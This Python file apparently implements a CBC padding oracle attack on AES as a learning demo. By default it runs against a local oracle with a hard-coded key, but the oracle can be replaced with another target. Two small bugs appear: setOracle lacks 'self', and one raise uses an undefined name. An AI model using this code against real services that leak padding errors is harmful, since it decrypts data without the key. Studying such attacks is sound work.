from Crypto.Cipher import AES
from Crypto.Util.Padding import unpad
from base64 import b64encode
from Crypto.Util.Padding import pad
from Crypto.Random import get_random_bytes
import traceback
import logging
import binascii

# We assume that the key was securely shared beforehand

debugDecrypt = False

class OracleAttack:

    defaultOracleKey = b"Sixteen byte key"

    def __init__(self):
        self.oracle = localOracle

    def setOracle(oracle):
        self.oracle = oracle

    def execute(self, cipherTextBytes: bytes):
        # Default to local oracle if no oracle is provided
        if self.oracle is None:
            self.oracle = localOracle

        cipherText = bytearray(cipherTextBytes)

        # Split ciphertext into block pairs
        pairs = splitCipherTextIntoBlockPairs(cipherText)

        decrypted = bytearray(0)

        for pair in pairs:
            # Key is only used for padding oracle.
            decryptedBlock = decryptPair(pair[0], pair[1], self.oracle)
            decrypted.extend(decryptedBlock)

        return bytes(decrypted)


def toHex(byteArray: bytearray):
    return ''.join('0x{:02x} '.format(x) for x in byteArray)


def encrypt(data, key):
    cipher = AES.new(key, AES.MODE_CBC)
    ct_bytes = cipher.encrypt(pad(data, AES.block_size))
    return cipher.iv, ct_bytes


def decrypt(ct, iv, key):
    cipher = AES.new(key, AES.MODE_CBC, iv)
    padded = cipher.decrypt(ct)
    pt = unpad(padded, AES.block_size)
    return pt, padded


def localOracle(cipherText: bytearray):
    key = b"Sixteen byte key"
    iv = cipherText[:AES.block_size]
    ct = cipherText[AES.block_size:]
    try:
        decrypt(ct, iv, key)
        return True
    except:
        return False

# Leaks the pos'th byte of the ciphertext
def leakByte(pos: int, targetCiphertextBlock: bytearray, precendingBlock: bytearray, fakePadding: int, originalByteAtPos: int, oracle):

    # try modifying the last byte of the block until we no longer get a padding error.
    for i in range(0, 256):
        # Check for padding error
        modified = precendingBlock[:]
        try:
            payload = i
            if debugDecrypt:
                print("Trying to inject 0x{:02X} as the {}th byte".format(
                    payload, pos+1))

            # Ensure that we test with modified byte
            if payload == originalByteAtPos and pos == AES.block_size-1:
                if debugDecrypt:
                    print("Skipping byte: 0x{:02X}".format(payload))
                continue

            modified[pos] = payload
            #print("after", modified)

            modifiedBytes = bytes(modified)
            ctBytes = bytes(targetCiphertextBlock)
            newCipherText = modifiedBytes+ctBytes

            if not oracle(newCipherText):
                continue

            # if debugDecrypt:
            #    print("Found a modified byte that did not cause padding error: 0x{:02X}".format(payload))
            #    print("Padded {}".format(padded))
            #    print("Unpadded {}".format(decrypted))

            # Obtain plaintext byte
            plaintextByte = payload ^ originalByteAtPos ^ fakePadding

            # In the case of the last byte (padding), ensure we actually got 0x01 instead of the actual padding byte
            # Since actual padding byte is plaintextbyte, then plaintextByte ^ i

            if debugDecrypt:
                print("Decrypted byte 0x{:02X}".format(plaintextByte))

            return plaintextByte
            #print("Plaintext (padding) byte is 0x{:02X} ^ 0x{:02X} ^ 0x01 = 0x{:02X}".format(i, oldByte, 1))

        except Exception as err:
            if str(err.args[0]) == 'PKCS#7 padding is incorrect.' or str(err.args[0]) == 'Padding is incorrect.':
                continue
            else:
                raise err

    raise Exception({error: "Could not find value to xor with"})


# Modifies the nth byte in block such that when the block is used in CBC decryption it will yield the wanted byte in the next block
def modifyByte(n, block, originalCipherTextByte, plainTextByte, wantedByte):
    #print("Block is {}".format(block))
    # Save old byte
    oldByte = originalCipherTextByte
    nextModifiedByte = plainTextByte ^ oldByte ^ wantedByte

    if debugDecrypt:
        print("Calculated that byte 0x{:02X} should be injected to obtain 0x{:02X} in as the {}th byte".format(
            nextModifiedByte, wantedByte, n+1))

    modified = block[:]
    modified[n] = nextModifiedByte

    if debugDecrypt:
        print("Modified block is [{}]".format(toHex(modified)))

    return modified


def splitCipherTextIntoBlockPairs(cipherTextBytes: bytearray):
    blocks = [(cipherTextBytes[i:i+AES.block_size])
              for i in range(0, len(cipherTextBytes), AES.block_size)]

    pairs = [(blocks[i-1], blocks[i]) for i in range(1, len(blocks), 1)]

    return pairs


def decryptPair(block1: bytearray, block2: bytearray, oracle):

    # Goal is to decryt block2 using block1
    targetCiphertextBlock = block2[:]
    decryptedBlock = bytearray(len(targetCiphertextBlock))
    precendingBlockCipherText = block1[:]

    fakePadding = 0x01
    for pos in range(len(block2)-1, -1, -1):
        if debugDecrypt:
            print("--------------------------")
        if debugDecrypt:
            print("Trying to decipher {}th byte".format(pos+1))

        try:
            # 1. Leak the plaintext byte pos at pos - key is just used to emulate padding oracle
            plaintextByte = leakByte(
                pos, targetCiphertextBlock, precendingBlockCipherText, fakePadding, block1[pos], oracle)
        except Exception as err:
            raise err

        # 2. Save the leaked plaintext byte
        decryptedBlock[pos] = plaintextByte

        if debugDecrypt:
            print("Decrypted: {}".format(decryptedBlock))

        # 3. Use leaked plaintext bytes to insert fake padding into the ciphertext to obtain next modified ciphertext
        fakePadding = fakePadding + 0x01
        for j in range(len(block2)-1, pos-1, -1):
            ptbyte = decryptedBlock[j]
            precendingBlockCipherText = modifyByte(
                j, precendingBlockCipherText, block1[j], ptbyte, fakePadding)

    return bytes(decryptedBlock)
